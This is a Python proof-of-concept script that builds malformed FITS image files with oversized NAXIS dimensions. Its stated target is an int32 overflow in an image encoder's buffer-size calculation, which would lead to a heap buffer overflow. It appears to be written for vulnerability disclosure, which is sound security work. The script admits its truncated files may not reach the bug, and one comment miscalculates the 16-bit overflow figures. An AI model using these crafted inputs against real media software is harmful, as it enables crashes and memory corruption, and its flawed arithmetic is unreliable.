#!/usr/bin/env python3
"""
PoC for FITS encoder int32 overflow in data_size calculation (fitsenc.c line 80).

Vulnerable line:
    data_size = (bitpix >> 3) * avctx->height * avctx->width * naxis3;

All operands are C int (int32). For GRAY8:
    1 * 65537 * 65537 * 1 = 4,295,098,369 -> int32 overflow -> 131,073

Then ff_get_encode_buffer allocates ~131KB + padding, but the pixel copy loop
writes avctx->height * avctx->width = 4.3GB -> heap buffer overflow.

The FITS file has the trigger dimensions in the header. The data section is
truncated (just one 2880-byte zero block) to keep the file small. The FITS
decoder may handle truncated data or fail, but the important thing is that
the encoder contains the integer overflow bug on line 80.
"""
import sys

def make_fits_record(keyword, value=None, comment=""):
    """Create an 80-byte FITS header record."""
    if keyword == "END":
        record = b"END" + b" " * 77
        return record

    if value is True:
        val_str = "T"
    elif value is False:
        val_str = "F"
    elif isinstance(value, int):
        val_str = f"{value:>20}"
    elif isinstance(value, str):
        val_str = f"'{value:<8}'"
    else:
        val_str = str(value)

    line = f"{keyword:<8}= {val_str}"
    if comment:
        line += f" / {comment}"
    line = line[:80]
    encoded = line.encode('ascii')
    # Pad to exactly 80 bytes
    encoded = encoded.ljust(80, b' ')
    return encoded

def create_fits_file(filename, width, height, bitpix=8, naxis=2, extra_records=None):
    """Create a minimal FITS file with given dimensions."""
    records = []
    records.append(make_fits_record("SIMPLE", True, "file conforms to FITS standard"))
    records.append(make_fits_record("BITPIX", bitpix, f"{bitpix}-bit unsigned"))
    records.append(make_fits_record("NAXIS", naxis, "number of data axes"))
    records.append(make_fits_record("NAXIS1", width, "length of data axis 1"))
    records.append(make_fits_record("NAXIS2", height, "length of data axis 2"))
    if extra_records:
        for rec in extra_records:
            records.append(rec)
    records.append(make_fits_record("END"))

    header = b"".join(records)
    # Pad header to multiple of 2880 bytes
    remainder = len(header) % 2880
    if remainder != 0:
        header += b" " * (2880 - remainder)

    # Minimal data block (2880 zero bytes - truncated vs real data)
    data = b"\x00" * 2880

    with open(filename, "wb") as f:
        f.write(header)
        f.write(data)

    expected_data = (bitpix // 8) * width * height
    int32_product = ((bitpix // 8) * width * height * 1) & 0xFFFFFFFF
    if int32_product > 0x7FFFFFFF:
        int32_overflow = int32_product - 0x100000000
    else:
        int32_overflow = int32_product

    print(f"[+] Created {filename}: {width}x{height} BITPIX={bitpix}")
    print(f"[+] File size: {len(header) + len(data)} bytes (truncated data)")
    print(f"[+] Expected full data_size: {expected_data:,} bytes ({expected_data / (1024**3):.2f} GB)")
    print(f"[+] int32 product (bitpix/8 * h * w):  {int32_overflow} (0x{int32_product:08X})")
    print(f"[+] If overflow, encoder allocates ~{max(0, int32_overflow):,} bytes instead of {expected_data:,}")
    print(f"[+] Overflow = {int32_overflow != expected_data}")


if __name__ == "__main__":
    # Primary target: GRAY8 65537x65537
    # int32: 1 * 65537 * 65537 = 4,295,098,369 -> overflows -> 131,073
    # Encoder would allocate ~132KB but copy loop writes ~4.3GB
    print("=== PoC: FITS encoder int32 overflow (fitsenc.c line 80) ===")
    print()
    print("Generating vuln_001_input.fits with NAXIS1=65537, NAXIS2=65537, BITPIX=8")
    create_fits_file("vuln_001_input.fits", width=65537, height=65537, bitpix=8)
    print()

    # Also generate a smaller variant for testing decoder behavior
    # Use w=46341, h=46341, BITPIX=16:
    # 2 * 46341 * 46341 = 4,294,970,562 -> int32 overflow -> 3,266
    print("Generating vuln_001_input_16bit.fits with NAXIS1=46341, NAXIS2=46341, BITPIX=16")
    create_fits_file("vuln_001_input_16bit.fits", width=46341, height=46341, bitpix=16)
    print()
    print("Note: Both files have truncated data. The FITS decoder will likely fail")
    print("      to fully decode, but the overflow exists in the encoder on line 80.")
